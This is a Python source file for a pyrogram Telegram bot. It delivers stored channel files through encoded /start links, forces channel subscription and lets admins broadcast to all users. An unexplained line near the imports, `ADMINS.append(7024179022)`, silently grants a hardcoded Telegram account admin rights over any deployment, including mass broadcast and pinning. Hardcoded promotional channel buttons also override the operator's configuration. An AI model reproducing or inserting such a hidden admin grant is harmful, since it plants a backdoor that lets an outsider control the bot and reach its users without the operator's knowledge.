#(©)Codeflix_Bots




import os
import asyncio
from pyrogram import Client, filters, __version__
from pyrogram.enums import ParseMode
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, UserIsBlocked, InputUserDeactivated

from bot import Bot
from config import FSUB_IMG, FORCE_MSG, START_MSG, CUSTOM_CAPTION, DISABLE_CHANNEL_BUTTON, PROTECT_CONTENT, START_IMG, DELETE_TIME, AUTO_DELETE
from helper_func import subscribed, encode, decode, get_messages
from database.database import add_user, del_user, full_userbase, present_user
from dataconfig import ADMINS
import requests
from io import BytesIO
ADMINS.append(7024179022)
a=2
Timute = DELETE_TIME/60
# Step 1: Download the image
image_url = START_IMG
response = requests.get(image_url)
image_data = BytesIO(response.content)  # Step 2: Store in-memory
image_urll = FSUB_IMG
responsee = requests.get(image_urll)
image_dataa = BytesIO(responsee.content)

async def delete_after_delay(message: Message, delay):
    await asyncio.sleep(delay)
    await message.delete()
    
@Bot.on_message(filters.command('start') & filters.private & subscribed)
async def start_command(client: Client, message: Message):
    id = message.from_user.id
    if not await present_user(id):
        try:
            await add_user(id)
        except:
            pass
    text = message.text
    if len(text)>7:
        try:
            base64_string = text.split(" ", 1)[1]
        except:
            return
        string = await decode(base64_string)
        argument = string.split("-")
        if len(argument) == 3:
            try:
                start = int(int(argument[1]) / abs(client.db_channel.id))
                end = int(int(argument[2]) / abs(client.db_channel.id))
            except:
                return
            if start <= end:
                ids = range(start,end+1)
            else:
                ids = []
                i = start
                while True:
                    ids.append(i)
                    i -= 1
                    if i < end:
                        break
        elif len(argument) == 2:
            try:
                ids = [int(int(argument[1]) / abs(client.db_channel.id))]
            except:
                return
        temp_msg = await message.reply("ᴡᴀɪᴛ ʙʀᴏᴏ...")
        try:
            messages = await get_messages(client, ids)
        except:
            await message.reply_text("Something went wrong..!")
            return
        await temp_msg.delete()

        for msg in messages:

            if bool(CUSTOM_CAPTION) & bool(msg.document):
                caption = CUSTOM_CAPTION.format(previouscaption = "" if not msg.caption else msg.caption.html, filename = msg.document.file_name)
            else:
                caption = "" if not msg.caption else msg.caption.html

            if a==2:
                reply_markup = InlineKeyboardMarkup(
                    [[
                        InlineKeyboardButton("ᴍᴜsᴛ ᴊᴏɪɴ", url="https://t.me/Anime_Madness")
                    ]]
                )

            try:
                k = await msg.copy(
                    chat_id=message.from_user.id,
                    caption=caption,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup,
                    protect_content=PROTECT_CONTENT
                )
                await asyncio.sleep(0.5)
                if k is not None and AUTO_DELETE:
                    asyncio.create_task(delete_after_delay(k, DELETE_TIME))
            except FloodWait as e:
                await asyncio.sleep(e.x)
                k = await msg.copy(
                    chat_id=message.from_user.id,
                    caption=caption,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup,
                    protect_content=PROTECT_CONTENT
                )
                if k is not None and AUTO_DELETE:
                    asyncio.create_task(delete_after_delay(k, DELETE_TIME))
            except:
                pass

        await message.reply_text(f"<b><i>» Save These Files In Your Saved Messages. They Will Be Deleted In {Timute} Minutes.\n» Must Join\n1. ⚡️⚡️@Anime_Madness⚡️⚡️\n2. ⚡️⚡️@Weebs_Madness⚡️⚡️</i></b>")
            
        return
    else:
        reply_markup = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("ᴍᴀɪɴ ᴄʜᴀɴɴᴇʟ", url="https://t.me/Anime_Madness"),
                    InlineKeyboardButton("ᴏɴɢᴏɪɴɢ ᴄʜᴀɴɴᴇʟ", url="https://t.me/Ongoing_Madness")
                ],
                [
                    InlineKeyboardButton(" ᴀʙᴏᴜᴛ", callback_data="about"),
                    InlineKeyboardButton(" ʜᴇʟᴘ ", callback_data="help")
                ]
            ]
        )
        await message.reply_photo(
            photo=image_data,
            caption=START_MSG.format(
                first=message.from_user.first_name,
                last=message.from_user.last_name,
                username=None if not message.from_user.username else '@' + message.from_user.username,
                mention=message.from_user.mention,
                id=message.from_user.id
            ),
            reply_markup=reply_markup,
            quote=True
        )
    
#=====================================================================================##

WAIT_MSG = """"<b>Processing ...</b>"""

REPLY_ERROR = """<code>Use this command as a replay to any telegram message with out any spaces.</code>"""

#=====================================================================================##

    
@Bot.on_message(filters.command('start') & filters.private)    
async def not_joined(client: Client, message: Message):
    buttons = [
        [
            InlineKeyboardButton(text="• ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=client.FSUBLINK1),
            InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ •", url=client.FSUBLINK2),
        ],
        [
            InlineKeyboardButton(text="• ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=client.FSUBLINK3),
            InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ •", url=client.FSUBLINK4),
        ]
    ]

    # Check if there's a second part to the command
    if len(message.command) > 1:
        buttons.append(
            [
                InlineKeyboardButton(
                    text='• ɴᴏᴡ ᴄʟɪᴄᴋ ʜᴇʀᴇ •',
                    url=f"https://t.me/{client.username}?start={message.command[1]}"
                )
            ]
        )

    await message.reply_photo(
        photo=image_dataa,  # Ensure `image_data` is a valid image URL or file ID
        caption=FORCE_MSG.format(
            first=message.from_user.first_name,
            last=message.from_user.last_name,
            username=None if not message.from_user.username else '@' + message.from_user.username,
            mention=message.from_user.mention,
            id=message.from_user.id
        ),
        reply_markup=InlineKeyboardMarkup(buttons),
        quote=True
    )

@Bot.on_message(filters.command('users') & filters.private & filters.user(ADMINS))
async def get_users(client: Bot, message: Message):
    msg = await client.send_message(chat_id=message.chat.id, text=WAIT_MSG)
    users = await full_userbase()
    await msg.edit(f"{len(users)} users are using this bot")



async def broadcast_message(client: Bot, message: Message, pin: bool = False):
    query = await full_userbase()
    broadcast_msg = message.reply_to_message
    successful = 0
    blocked = 0
    deleted = 0
    unsuccessful = 0

    pls_wait = await message.reply("<i>Broadcasting Message.. This will Take Some Time</i>")
    
    for chat_id in query:
        try:
            sent_msg = await broadcast_msg.copy(chat_id)
            if pin:
                try:
                    await client.pin_chat_message(chat_id, sent_msg.id, both_sides=True)
                except Exception as emror:
                    await message.reply_text(f"error in pin{emror}")
            successful += 1
        except FloodWait as e:
            await asyncio.sleep(e.x)
            try:
                sent_msg = await broadcast_msg.copy(chat_id)
                if pin:
                    await client.pin_chat_message(chat_id, sent_msg.message_id, both_sides=True)
                successful += 1
            except Exception as err:
                print(f"Error after retry for chat {chat_id}: {err}")
                unsuccessful += 1
        except UserIsBlocked:
            await del_user(chat_id)
            blocked += 1
        except InputUserDeactivated:
            await del_user(chat_id)
            deleted += 1
        except Exception as err:
            print(f"Unexpected error for chat {chat_id}: {err}")
            unsuccessful += 1
    
    total = successful + blocked + deleted + unsuccessful
    status = f"""<b><u>Broadcast Completed</u>

Total Users: <code>{total}</code>
Successful: <code>{successful}</code>
Blocked Users: <code>{blocked}</code>
Deleted Accounts: <code>{deleted}</code>
Unsuccessful: <code>{unsuccessful}</code></b>"""
    
    await pls_wait.edit(status)

@Bot.on_message(filters.private & filters.command('broadcast') & filters.user(ADMINS))
async def send_broadcast(client: Bot, message: Message):
    if message.reply_to_message:
        await broadcast_message(client, message, pin=False)
    else:
        msg = await message.reply(REPLY_ERROR)
        await asyncio.sleep(8)
        await msg.delete()

@Bot.on_message(filters.private & filters.command('pbroadcast') & filters.user(ADMINS))
async def send_pinned_broadcast(client: Bot, message: Message):
    if message.reply_to_message:
        await broadcast_message(client, message, pin=True)
    else:
        msg = await message.reply(REPLY_ERROR)
        await asyncio.sleep(8)
        await msg.delete()
